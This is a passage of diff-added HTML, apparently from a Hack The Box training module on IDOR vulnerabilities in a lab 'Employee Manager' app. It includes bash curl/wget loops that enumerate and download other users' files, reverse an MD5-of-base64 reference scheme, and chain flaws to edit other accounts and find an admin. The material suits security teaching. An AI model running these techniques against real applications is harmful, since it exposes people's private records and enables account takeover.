+        <span class="hljs-attr">success</span>:<span class="hljs-function"><span class="hljs-keyword">function</span>(<span class="hljs-params">result</span>)</span>{
+            <span class="hljs-comment">//</span>
+        }
+    });
+}
+</code></pre>
+<p>The above function may never be called when we use the web application as a non-admin user. However, if we locate it in the front-end code, we may test it in different ways to see whether we can call it to perform changes, which would indicate that it is vulnerable to IDOR. We can do the same with back-end code if we have access to it (e.g., open-source web applications).</p>
+<hr>
+<h3 id="understand-hashing-encoding">Understand Hashing/Encoding</h3>
+<p>Some web applications may not use simple sequential numbers as object references but may encode the reference or hash it instead. If we find such parameters using encoded or hashed values, we may still be able to exploit them if there is no access control system on the back-end.</p>
+<p>Suppose the reference was encoded with a common encoder (e.g. <code>base64</code>). In that case, we could decode it and view the plaintext of the object reference, change its value, and then encode it again to access other data. For example, if we see a reference like (<code>?filename=ZmlsZV8xMjMucGRm</code>), we can immediately guess that the file name is <code>base64</code> encoded (from its character set), which we can decode to get the original object reference of (<code>file_123.pdf</code>). Then, we can try encoding a different object reference (e.g. <code>file_124.pdf</code>) and try accessing it with the encoded object reference (<code>?filename=ZmlsZV8xMjQucGRm</code>), which may reveal an IDOR vulnerability if we were able to retrieve any data.</p>
+<p>On the other hand, the object reference may be hashed, like (<code>download.php?filename=c81e728d9d4c2f636f067f89cc14862c</code>). At a first glance, we may think that this is a secure object reference, as it is not using any clear text or easy encoding. However, if we look at the source code, we may see what is being hashed before the API call is made:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">$.ajax({
+    url:<span class="hljs-string">"download.php"</span>,
+    <span class="hljs-class"><span class="hljs-keyword">type</span>: "post",</span>
+    dataType: <span class="hljs-string">"json"</span>,
+    <span class="hljs-class"><span class="hljs-keyword">data</span>: {<span class="hljs-title">filename</span>: <span class="hljs-type">CryptoJS</span>.<span class="hljs-type">MD5</span>('<span class="hljs-title">file_1</span>.<span class="hljs-title">pdf'</span>).<span class="hljs-title">toString</span>()},</span>
+    success:function(result){
+        //
+    }
+});
+</code></pre>
+<p>In this case, we can see that code uses the <code>filename</code> and hashing it with <code>CryptoJS.MD5</code>, making it easy for us to calculate the <code>filename</code> for other potential files. Otherwise, we may manually try to identify the hashing algorithm being used (e.g., with hash identifier tools) and then hash the filename to see if it matches the used hash. Once we can calculate hashes for other files, we may try downloading them, which may reveal an IDOR vulnerability if we can download any files that do not belong to us.</p>
+<hr>
+<h3 id="compare-user-roles">Compare User Roles</h3>
+<p>If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests and object references. This may allow us to understand how the URL parameters and unique identifiers are being calculated and then calculate them for other users to gather their data.</p>
+<p>For example, if we had access to two different users, one of which can view their salary after making the following API call:</p>
+<p>Code: json</p>
+<pre><code class="lang-json">{
+  <span class="hljs-attr">"attributes"</span> : 
+    {
+      <span class="hljs-attr">"type"</span> : <span class="hljs-string">"salary"</span>,
+      <span class="hljs-attr">"url"</span> : <span class="hljs-string">"/services/data/salaries/users/1"</span>
+    },
+  <span class="hljs-attr">"Id"</span> : <span class="hljs-string">"1"</span>,
+  <span class="hljs-attr">"Name"</span> : <span class="hljs-string">"User1"</span>
+
+}
+</code></pre>
+<p>The second user may not have all of these API parameters to replicate the call and should not be able to make the same call as <code>User1</code>. However, with these details at hand, we can try repeating the same API call while logged in as <code>User2</code> to see if the web application returns anything. Such cases may work if the web application only requires a valid logged-in session to make the API call but has no access control on the back-end to compare the caller's session with the data being called.</p>
+<p>If this is the case, and we can calculate the API parameters for other users, this would be an IDOR vulnerability. Even if we could not calculate the API parameters for other users, we would still have identified a vulnerability in the back-end access control system and may start looking for other object references to exploit.</p>
+<h2 id="mass-idor-enumeration">Mass IDOR Enumeration</h2>
+<hr>
+<p>Exploiting IDOR vulnerabilities is easy in some instances but can be very challenging in others. Once we identify a potential IDOR, we can start testing it with basic techniques to see whether it would expose any other data. As for advanced IDOR attacks, we need to better understand how the web application works, how it calculates its object references, and how its access control system works to be able to perform advanced attacks that may not be exploitable with basic techniques.</p>
+<p>Let's start discussing various techniques of exploiting IDOR vulnerabilities, from basic enumeration to mass data gathering, to user privilege escalation.</p>
+<hr>
+<h3 id="insecure-parameters">Insecure Parameters</h3>
+<p>Let's start with a basic example that showcases a typical IDOR vulnerability. The exercise below is an <code>Employee Manager</code> web application that hosts employee records:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_employee\_manager.jpg" alt=""></p>
+<p>Our web application assumes that we are logged in as an employee with user id <code>uid=1</code> to simplify things. This would require us to log in with credentials in a real web application, but the rest of the attack would be the same. Once we click on <code>Documents</code>, we are redirected to</p>
+<p><code>/documents.php</code>:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_documents.jpg" alt=""></p>
+<p>When we get to the <code>Documents</code> page, we see several documents that belong to our user. These can be files uploaded by our user or files set for us by another department (e.g., HR Department). Checking the file links, we see that they have individual names:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-regexp">/documents/</span>Invoice_1_09_2021.pdf
+<span class="hljs-regexp">/documents/</span>Report_1_10_2021.pdf
+</code></pre>
+<p>We see that the files have a predictable naming pattern, as the file names appear to be using the user <code>uid</code> and the month/year as part of the file name, which may allow us to fuzz files for other users. This is the most basic type of IDOR vulnerability and is called <code>static file IDOR</code>. However, to successfully fuzz other files, we would assume that they all start with <code>Invoice</code> or <code>Report</code>, which may reveal some files but not all. So, let's look for a more solid IDOR vulnerability.</p>
+<p>We see that the page is setting our <code>uid</code> with a <code>GET</code> parameter in the URL as (<code>documents.php?uid=1</code>). If the web application uses this <code>uid</code> GET parameter as a direct reference to the employee records it should show, we may be able to view other employees' documents by simply changing this value. If the back-end end of the web application <code>does</code> have a proper access control system, we will get some form of <code>Access Denied</code>. However, given that the web application passes as our <code>uid</code> in clear text as a direct reference, this may indicate poor web application design, leading to arbitrary access to employee records.</p>
+<p>When we try changing the <code>uid</code> to <code>?uid=2</code>, we don't notice any difference in the page output, as we are still getting the same list of documents, and may assume that it still returns our own documents:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_documents.jpg" alt=""></p>
+<p>However, <code>we must be attentive to the page details during any web pentest</code> and always keep an eye on the source code and page size. If we look at the linked files, or if we click on them to view them, we will notice that these are indeed different files, which appear to be the documents belonging to the employee with <code>uid=2</code>:</p>
+<p>Code: html</p>
+<pre><code class="lang-html"><span class="hljs-regexp">/documents/</span>Invoice_2_08_2020.pdf
+<span class="hljs-regexp">/documents/</span>Report_2_12_2020.pdf
+</code></pre>
+<p>This is a common mistake found in web applications suffering from IDOR vulnerabilities, as they place the parameter that controls which user documents to show under our control while having no access control system on the back-end. Another example is using a filter parameter to only display a specific user's documents (e.g. <code>uid_filter=1</code>), which can also be manipulated to show other users' documents or even completely removed to show all documents at once.</p>
+<hr>
+<h3 id="mass-enumeration">Mass Enumeration</h3>
+<p>We can try manually accessing other employee documents with <code>uid=3</code>, <code>uid=4</code>, and so on. However, manually accessing files is not efficient in a real work environment with hundreds or thousands of employees. So, we can either use a tool like <code>Burp Intruder</code> or <code>ZAP Fuzzer</code> to retrieve all files or write a small bash script to download all files, which is what we will do.</p>
+<p>We can click on [<code>CTRL+SHIFT+C</code>] in Firefox to enable the <code>element inspector</code>, and then click on any of the links to view their HTML source code, and we will get the following:</p>
+<p>Code: html</p>
+<pre><code class="lang-html">&lt;li <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">'pure-tree_link'</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">'/documents/Invoice_3_06_2020.pdf'</span> <span class="hljs-attr">target</span>=<span class="hljs-string">'_blank'</span>&gt;</span>Invoice<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span>
+&lt;li <span class="hljs-class"><span class="hljs-keyword">class</span></span>=<span class="hljs-string">'pure-tree_link'</span>&gt;<span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">'/documents/Report_3_01_2020.pdf'</span> <span class="hljs-attr">target</span>=<span class="hljs-string">'_blank'</span>&gt;</span>Report<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span></span><span class="xml"><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span></span>
+</code></pre>
+<p>We can pick any unique word to be able to <code>grep</code> the link of the file. In our case, we see that each link starts with <code>&lt;li class='pure-tree_link'&gt;</code>, so we may <code>curl</code> the page and <code>grep</code> for this line, as follows:</p>
+<p>Mass IDOR Enumeration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ curl -s "http://SERVER_IP:PORT/documents.php?uid=1" | grep "<span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">'pure-tree_link'</span>&gt;</span>"
+
+<span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">'pure-tree_link'</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">'/documents/Invoice_3_06_2020.pdf'</span> <span class="hljs-attr">target</span>=<span class="hljs-string">'_blank'</span>&gt;</span>Invoice<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">'pure-tree_link'</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">'/documents/Report_3_01_2020.pdf'</span> <span class="hljs-attr">target</span>=<span class="hljs-string">'_blank'</span>&gt;</span>Report<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span>
+</code></pre>
+<p>As we can see, we were able to capture the document links successfully. We may now use specific bash commands to trim the extra parts and only get the document links in the output. However, it is a better practice to use a <code>Regex</code> pattern that matches strings between <code>/document</code> and <code>.pdf</code>, which we can use with <code>grep</code> to only get the document links, as follows:</p>
+<p>Mass IDOR Enumeration</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ curl -s <span class="hljs-string">"http://SERVER_IP:PORT/documents.php?uid=3"</span> | grep -oP <span class="hljs-string">"\/documents.*?.pdf"</span>
+
+/documents/Invoice_3_06_2020.pdf
+/documents/Report_3_01_2020.pdf
+</code></pre>
+<p>Now, we can use a simple <code>for</code> loop to loop over the <code>uid</code> parameter and return the document of all employees, and then use <code>wget</code> to download each document link:</p>
+<p>Code: bash</p>
+<pre><code class="lang-bash"><span class="hljs-meta">#!/bin/bash
+</span>
+url=<span class="hljs-string">"http://SERVER_IP:PORT"</span>
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..10}; <span class="hljs-keyword">do</span>
+        <span class="hljs-keyword">for</span> link <span class="hljs-keyword">in</span> $(curl <span class="hljs-_">-s</span> <span class="hljs-string">"<span class="hljs-variable">$url</span>/documents.php?uid=<span class="hljs-variable">$i</span>"</span> | grep -oP <span class="hljs-string">"\/documents.*?.pdf"</span>); <span class="hljs-keyword">do</span>
+                wget -q <span class="hljs-variable">$url</span>/<span class="hljs-variable">$link</span>
+        <span class="hljs-keyword">done</span>
+<span class="hljs-keyword">done</span>
+</code></pre>
+<p>When we run the script, it will download all documents from all employees with <code>uids</code> between 1-10, thus successfully exploiting the IDOR vulnerability to mass enumerate the documents of all employees. This script is one example of how we can achieve the same objective. Try using a tool like Burp Intruder or ZAP Fuzzer, or write another Bash or PowerShell script to download all documents.</p>
+<h2 id="bypassing-encoded-references">Bypassing Encoded References</h2>
+<hr>
+<p>In the previous section, we saw an example of an IDOR that uses employee uids in clear text, making it easy to enumerate. In some cases, web applications make hashes or encode their object references, making enumeration more difficult, but it may still be possible.</p>
+<p>Let's go back to the <code>Employee Manager</code> web application to test the <code>Contracts</code> functionality:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_contracts.jpg" alt=""></p>
+<p>If we click on the <code>Employment_contract.pdf</code> file, it starts downloading the file. The intercepted request in Burp looks as follows:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_download\_contract.jpg" alt="download\_contract"></p>
+<p>We see that it is sending a <code>POST</code> request to <code>download.php</code> with the following data:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="hljs-attr">contract</span>=cdd96d3cc73d1dbdaffa03cc6cd7339b
+</code></pre>
+<p>Using a <code>download.php</code> script to download files is a common practice to avoid directly linking to files, as that may be exploitable with multiple web attacks. In this case, the web application is not sending the direct reference in cleartext but appears to be hashing it in an <code>md5</code> format. Hashes are one-way functions, so we cannot decode them to see their original values.</p>
+<p>We can attempt to hash various values, like <code>uid</code>, <code>username</code>, <code>filename</code>, and many others, and see if any of their <code>md5</code> hashes match the above value. If we find a match, then we can replicate it for other users and collect their files. For example, let's try to compare the <code>md5</code> hash of our <code>uid</code>, and see if it matches the above hash:</p>
+<p>Bypassing Encoded References</p>
+<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ echo -n <span class="hljs-number">1</span> | md5sum
+
+c4ca4238a0b923820dcc509a6f75849b -
+</code></pre>
+<p>Unfortunately, the hashes do not match. We can attempt this with various other fields, but none of them matches our hash. In advanced cases, we may also utilize <code>Burp Comparer</code> and fuzz various values and then compare each to our hash to see if we find any matches. In this case, the <code>md5</code> hash could be for a unique value or a combination of values, which would be very difficult to predict, making this direct reference a <code>Secure Direct Object Reference</code>. However, there's one fatal flaw in this web application.</p>
+<hr>
+<h3 id="function-disclosure">Function Disclosure</h3>
+<p>As most modern web applications are developed using JavaScript frameworks, like <code>Angular</code>, <code>React</code>, or <code>Vue.js</code>, many web developers may make the mistake of performing sensitive functions on the front-end, which would expose them to attackers. For example, if the above hash was being calculated on the front-end, we can study the function and then replicate what it's doing to calculate the same hash. Luckily for us, this is precisely the case in this web application.</p>
+<p>If we take a look at the link in the source code, we see that it is calling a JavaScript function with <code>javascript:downloadContract('1')</code>. Looking at the <code>downloadContract()</code> function in the source code, we see the following:</p>
+<p>Code: javascript</p>
+<pre><code class="lang-javascript">function downloadContract(uid) {
+    $.redirect(<span class="hljs-string">"/download.php"</span>, {
+        contract: CryptoJS.MD5(btoa(uid)).toString(),
+    }, <span class="hljs-string">"<span class="hljs-keyword">POST</span>"</span>, <span class="hljs-string">"_self"</span>);
+}
+</code></pre>
+<p>This function appears to be sending a <code>POST</code> request with the <code>contract</code> parameter, which is what we saw above. The value it is sending is an <code>md5</code> hash using the <code>CryptoJS</code> library, which also matches the request we saw earlier. So, the only thing left to see is what value is being hashed.</p>
+<p>In this case, the value being hashed is <code>btoa(uid)</code>, which is the <code>base64</code> encoded string of the <code>uid</code> variable, which is an input argument for the function. Going back to the earlier link where the function was called, we see it calling <code>downloadContract('1')</code>. So, the final value being used in the <code>POST</code> request is the <code>base64</code> encoded string of <code>1</code>, which was then <code>md5</code> hashed.</p>
+<p>We can test this by <code>base64</code> encoding our <code>uid=1</code>, and then hashing it with <code>md5</code>, as follows:</p>
+<p>Bypassing Encoded References</p>
+<pre><code class="lang-shell-session">root<span class="hljs-meta">@htb[/htb]$</span> echo -n 1 |<span class="hljs-string"> base64 -w 0 </span>|<span class="hljs-string"> md5sum
+
+cdd96d3cc73d1dbdaffa03cc6cd7339b -</span>
+</code></pre>
+<p>Tip: We are using the <code>-n</code> flag with <code>echo</code>, and the <code>-w 0</code> flag with <code>base64</code>, to avoid adding newlines, in order to be able to calculate the <code>md5</code> hash of the same value, without hashing newlines, as that would change the final <code>md5</code> hash.</p>
+<p>As we can see, this hash matches the hash in our request, meaning that we have successfully reversed the hashing technique used on the object references, turning them into IDOR's. With that, we can begin enumerating other employees' contracts using the same hashing method we used above. <code>Before continuing, try to write a script similar to what we used in the previous section to enumerate all contracts</code>.</p>
+<hr>
+<h3 id="mass-enumeration">Mass Enumeration</h3>
+<p>Once again, let us write a simple bash script to retrieve all employee contracts. More often than not, this is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities. In more advanced cases, we may utilize tools like <code>Burp Intruder</code> or <code>ZAP Fuzzer</code>, but a simple bash script should be the best course for our exercise.</p>
+<p>We can start by calculating the hash for each of the first ten employees using the same previous command while using <code>tr -d</code> to remove the trailing <code>-</code> characters, as follows:</p>
+<p>Bypassing Encoded References</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..10}; <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> -n <span class="hljs-variable">$i</span> | base64 -w 0 | md5sum | tr <span class="hljs-_">-d</span> <span class="hljs-string">' -'</span>; <span class="hljs-keyword">done</span>
+
+cdd96d3cc73d1dbdaffa03cc6<span class="hljs-built_in">cd</span>7339b
+0b7e7dee87b1c3b98e72131173dfbbbf
+0b24df25fe628797b3a50ae0724d2730
+f7947d50da7a043693a592b4db43b0a1
+8b9af1f7f76daf0f02bd9c48c4a2e3d0
+006d1236aee3f92b8322299796ba1989
+b523ff8d1ced96cef9c86492e790c2fb
+d477819d240e7d3dd9499ed8d23e7158
+3e57e65a34ffcb2e93cb545d024f5bde
+5d4aace023dc088767b4e08c79415dcd
+</code></pre>
+<p>Next, we can make a <code>POST</code> request on <code>download.php</code> with each of the above hashes as the <code>contract</code> value, which should give us our final script:</p>
+<p>Code: bash</p>
+<pre><code class="lang-bash"><span class="hljs-meta">#!/bin/bash
+</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> {1..10}; <span class="hljs-keyword">do</span>
+    <span class="hljs-keyword">for</span> <span class="hljs-built_in">hash</span> <span class="hljs-keyword">in</span> $(<span class="hljs-built_in">echo</span> -n <span class="hljs-variable">$i</span> | base64 -w 0 | md5sum | tr <span class="hljs-_">-d</span> <span class="hljs-string">' -'</span>); <span class="hljs-keyword">do</span>
+        curl <span class="hljs-_">-s</span>OJ -X POST <span class="hljs-_">-d</span> <span class="hljs-string">"contract=<span class="hljs-variable">$hash</span>"</span> http://SERVER_IP:PORT/download.php
+    <span class="hljs-keyword">done</span>
+<span class="hljs-keyword">done</span>
+</code></pre>
+<p>With that, we can run the script, and it should download all contracts for employees 1-10:</p>
+<p>Bypassing Encoded References</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ bash ./exploit<span class="hljs-selector-class">.sh</span>
+root@htb[/htb]$ ls -<span class="hljs-number">1</span>
+
+contract_006d1236aee3f92b8322299796ba1989<span class="hljs-selector-class">.pdf</span>
+contract_0b24df25fe628797b3a50ae0724d2730<span class="hljs-selector-class">.pdf</span>
+contract_0b7e7dee87b1c3b98e72131173dfbbbf<span class="hljs-selector-class">.pdf</span>
+contract_3e57e65a34ffcb2e93cb545d024f5bde<span class="hljs-selector-class">.pdf</span>
+contract_5d4aace023dc088767b4e08c79415dcd<span class="hljs-selector-class">.pdf</span>
+contract_8b9af1f7f76daf0f02bd9c48c4a2e3d0<span class="hljs-selector-class">.pdf</span>
+contract_b523ff8d1ced96cef9c86492e790c2fb<span class="hljs-selector-class">.pdf</span>
+contract_cdd96d3cc73d1dbdaffa03cc6cd7339b<span class="hljs-selector-class">.pdf</span>
+contract_d477819d240e7d3dd9499ed8d23e7158<span class="hljs-selector-class">.pdf</span>
+contract_f7947d50da7a043693a592b4db43b0a1.pdf
+</code></pre>
+<p>As we can see, because we could reverse the hashing technique used on the object references, we can now successfully exploit the IDOR vulnerability to retrieve all other users' contracts.</p>
+<h2 id="idor-in-insecure-apis">IDOR in Insecure APIs</h2>
+<hr>
+<p>So far, we have only been using IDOR vulnerabilities to access files and resources that are out of our user's access. However, IDOR vulnerabilities may also exist in function calls and APIs, and exploiting them would allow us to perform various actions as other users.</p>
+<p>While <code>IDOR Information Disclosure Vulnerabilities</code> allow us to read various types of resources, <code>IDOR Insecure Function Calls</code> enable us to call APIs or execute functions as another user. Such functions and APIs can be used to change another user's private information, reset another user's password, or even buy items using another user's payment information. In many cases, we may be obtaining certain information through an information disclosure IDOR vulnerability and then using this information with IDOR insecure function call vulnerabilities, as we will see later in the module.</p>
+<hr>
+<h3 id="identifying-insecure-apis">Identifying Insecure APIs</h3>
+<p>Going back to our <code>Employee Manager</code> web application, we can start testing the <code>Edit Profile</code> page for IDOR vulnerabilities:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_employee\_manager.jpg" alt=""></p>
+<p>When we click on the <code>Edit Profile</code> button, we are taken to a page to edit information of our user profile, namely <code>Full Name</code>, <code>Email</code>, and <code>About Me</code>, which is a common feature in many web applications:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_edit\_profile.jpg" alt=""></p>
+<p>We can change any of the details in our profile and click <code>Update profile</code>, and we'll see that they get updated and persist through refreshes, which means they get updated in a database somewhere. Let's intercept the <code>Update</code> request in Burp and look at it:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_update\_request.jpg" alt="update\_request"></p>
+<p>We see that the page is sending a <code>PUT</code> request to the <code>/profile/api.php/profile/1</code> API endpoint. <code>PUT</code> requests are usually used in APIs to update item details, while <code>POST</code> is used to create new items, <code>DELETE</code> to delete items, and <code>GET</code> to retrieve item details. So, a <code>PUT</code> request for the <code>Update profile</code> function is expected. The interesting bit is the JSON parameters it is sending:</p>
+<p>Code: json</p>
+<pre><code class="lang-json">{
+    <span class="hljs-attr">"uid"</span>: <span class="hljs-number">1</span>,
+    <span class="hljs-attr">"uuid"</span>: <span class="hljs-string">"40f5888b67c748df7efba008e7c2f9d2"</span>,
+    <span class="hljs-attr">"role"</span>: <span class="hljs-string">"employee"</span>,
+    <span class="hljs-attr">"full_name"</span>: <span class="hljs-string">"Amy Lindon"</span>,
+    <span class="hljs-attr">"email"</span>: <span class="hljs-string">"a_lindon@employees.htb"</span>,
+    <span class="hljs-attr">"about"</span>: <span class="hljs-string">"A Release is like a boat. 80% of the holes plugged is not good enough."</span>
+}
+</code></pre>
+<p>We see that the <code>PUT</code> request includes a few hidden parameters, like <code>uid</code>, <code>uuid</code>, and most interestingly <code>role</code>, which is set to <code>employee</code>. The web application also appears to be setting the user access privileges (e.g. <code>role</code>) on the client-side, in the form of our <code>Cookie: role=employee</code> cookie, which appears to reflect the <code>role</code> specified for our user. This is a common security issue. The access control privileges are sent as part of the client's HTTP request, either as a cookie or as part of the JSON request, leaving it under the client's control, which could be manipulated to gain more privileges.</p>
+<p>So, unless the web application has a solid access control system on the back-end, <code>we should be able to set an arbitrary role for our user, which may grant us more privileges</code>. However, how would we know what other roles exist?</p>
+<hr>
+<h3 id="exploiting-insecure-apis">Exploiting Insecure APIs</h3>
+<p>We know that we can change the <code>full_name</code>, <code>email</code>, and <code>about</code> parameters, as these are the ones under our control in the HTML form in the <code>/profile</code> web page. So, let's try to manipulate the other parameters.</p>
+<p>There are a few things we could try in this case:</p>
+<ol>
+<li>Change our <code>uid</code> to another user's <code>uid</code>, such that we can take over their accounts</li>
+<li>Change another user's details, which may allow us to perform several web attacks</li>
+<li>Create new users with arbitrary details, or delete existing users</li>
+<li>Change our role to a more privileged role (e.g. <code>admin</code>) to be able to perform more actions</li>
+</ol>
+<p>Let's start by changing our <code>uid</code> to another user's <code>uid</code> (e.g. <code>"uid": 2</code>). However, any number we set other than our own <code>uid</code> gets us a response of <code>uid mismatch</code>:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_uid\_mismatch.jpg" alt="uid\_mismatch"></p>
+<p>The web application appears to be comparing the request's <code>uid</code> to the API endpoint (<code>/1</code>). This means that a form of access control on the back-end prevents us from arbitrarily changing some JSON parameters, which might be necessary to prevent the web application from crashing or returning errors.</p>
+<p>Perhaps we can try changing another user's details. We'll change the API endpoint to <code>/profile/api.php/profile/2</code>, and change <code>"uid": 2</code> to avoid the previous <code>uid mismatch</code>:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_uuid\_mismatch.jpg" alt="uuid\_mismatch"></p>
+<p>As we can see, this time, we get an error message saying <code>uuid mismatch</code>. The web application appears to be checking if the <code>uuid</code> value we are sending matches the user's <code>uuid</code>. Since we are sending our own <code>uuid</code>, our request is failing. This appears to be another form of access control to prevent users from changing another user's details.</p>
+<p>Next, let's see if we can create a new user with a <code>POST</code> request to the API endpoint. We can change the request method to <code>POST</code>, change the <code>uid</code> to a new <code>uid</code>, and send the request to the API endpoint of the new <code>uid</code>:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_create\_new\_user\_1.jpg" alt="create\_new\_user\_1"></p>
+<p>We get an error message saying <code>Creating new employees is for admins only</code>. The same thing happens when we send a <code>Delete</code> request, as we get <code>Deleting employees is for admins only</code>. The web application might be checking our authorization through the <code>role=employee</code> cookie because this appears to be the only form of authorization in the HTTP request.</p>
+<p>Finally, let's try to change our <code>role</code> to <code>admin</code>/<code>administrator</code> to gain higher privileges. Unfortunately, without knowing a valid <code>role</code> name, we get <code>Invalid role</code> in the HTTP response, and our <code>role</code> does not update: <img src="storage\modules\134\web\_attacks\_idor\_invalid\_role.jpg" alt="invalid\_role"></p>
+<p>So, <code>all of our attempts appear to have failed</code>. We cannot create or delete users as we cannot change our <code>role</code>. We cannot change our own <code>uid</code>, as there are preventive measures on the back-end that we cannot control, nor can we change another user's details for the same reason. <code>So, is the web application secure against IDOR attacks?</code>.</p>
+<p>So far, we have only been testing the <code>IDOR Insecure Function Calls</code>. However, we have not tested the API's <code>GET</code> request for <code>IDOR Information Disclosure Vulnerabilities</code>. If there was no robust access control system in place, we might be able to read other users' details, which may help us with the previous attacks we attempted.</p>
+<p><code>Try to test the API against IDOR Information Disclosure vulnerabilities by attempting to get other users' details with GET requests</code>. If the API is vulnerable, we may be able to leak other users' details and then use this information to complete our IDOR attacks on the function calls.</p>
+<h2 id="chaining-idor-vulnerabilities">Chaining IDOR Vulnerabilities</h2>
+<hr>
+<p>Usually, a <code>GET</code> request to the API endpoint should return the details of the requested user, so we may try calling it to see if we can retrieve our user's details. We also notice that after the page loads, it fetches the user details with a <code>GET</code> request to the same API endpoint: <img src="storage\modules\134\web\_attacks\_idor\_get\_api.jpg" alt="get\_api"></p>
+<p>As mentioned in the previous section, the only form of authorization in our HTTP requests is the <code>role=employee</code> cookie, as the HTTP request does not contain any other form of user-specific authorization, like a JWT token, for example. Even if a token did exist, unless it was being actively compared to the requested object details by a back-end access control system, we may still be able to retrieve other users' details.</p>
+<hr>
+<h3 id="information-disclosure">Information Disclosure</h3>
+<p>Let's send a <code>GET</code> request with another <code>uid</code>:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_get\_another\_user.jpg" alt="get\_another\_user"></p>
+<p>As we can see, this returned the details of another user, with their own <code>uuid</code> and <code>role</code>, confirming an <code>IDOR Information Disclosure vulnerability</code>:</p>
+<p>Code: json</p>
+<pre><code class="lang-json">{
+    <span class="hljs-attr">"uid"</span>: <span class="hljs-string">"2"</span>,
+    <span class="hljs-attr">"uuid"</span>: <span class="hljs-string">"4a9bd19b3b8676199592a346051f950c"</span>,
+    <span class="hljs-attr">"role"</span>: <span class="hljs-string">"employee"</span>,
+    <span class="hljs-attr">"full_name"</span>: <span class="hljs-string">"Iona Franklyn"</span>,
+    <span class="hljs-attr">"email"</span>: <span class="hljs-string">"i_franklyn@employees.htb"</span>,
+    <span class="hljs-attr">"about"</span>: <span class="hljs-string">"It takes 20 years to build a reputation and few minutes of cyber-incident to ruin it."</span>
+}
+</code></pre>
+<p>This provides us with new details, most notably the <code>uuid</code>, which we could not calculate before, and thus could not change other users' details.</p>
+<hr>
+<h3 id="modifying-other-users-details">Modifying Other Users' Details</h3>
+<p>Now, with the user's <code>uuid</code> at hand, we can change this user's details by sending a <code>PUT</code> request to <code>/profile/api.php/profile/2</code> with the above details along with any modifications we made, as follows:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_modify\_another\_user.jpg" alt="modify\_another\_user"></p>
+<p>We don't get any access control error messages this time, and when we try to <code>GET</code> the user details again, we see that we did indeed update their details:</p>
+<p><img src="storage\modules\134\web\_attacks\_idor\_new\_another\_user\_details.jpg" alt="new\_another\_user\_details"></p>
+<p>In addition to allowing us to view potentially sensitive details, the ability to modify another user's details also enables us to perform several other attacks. One type of attack is <code>modifying a user's email address</code> and then requesting a password reset link, which will be sent to the email address we specified, thus allowing us to take control over their account. Another potential attack is <code>placing an XSS payload in the 'about' field</code>, which would get executed once the user visits their <code>Edit profile</code> page, enabling us to attack the user in different ways.</p>
+<hr>
+<h3 id="chaining-two-idor-vulnerabilities">Chaining Two IDOR Vulnerabilities</h3>
+<p>Since we have identified an IDOR Information Disclosure vulnerability, we may also enumerate all users and look for other <code>roles</code>, ideally an admin role. <code>Try to write a script to enumerate all users, similarly to what we did previously</code>.</p>
+<p>Once we enumerate all users, we will find an admin user with the following details:</p>
+<p>Code: json</p>
+<pre><code class="lang-json">{
+    <span class="hljs-attr">"uid"</span>: <span class="hljs-string">"X"</span>,
+    <span class="hljs-attr">"uuid"</span>: <span class="hljs-string">"a36fa9e66e85f2dd6f5e13cad45248ae"</span>,
+    <span class="hljs-attr">"role"</span>: <span class="hljs-string">"web_admin"</span>,
+    <span class="hljs-attr">"full_name"</span>: <span class="hljs-string">"administrator"</span>,
+    <span class="hljs-attr">"email"</span>: <span class="hljs-string">"webadmin@employees.htb"</span>,
+    <span class="hljs-attr">"about"</span>: <span class="hljs-string">"HTB{FLAG}"</span>
+}
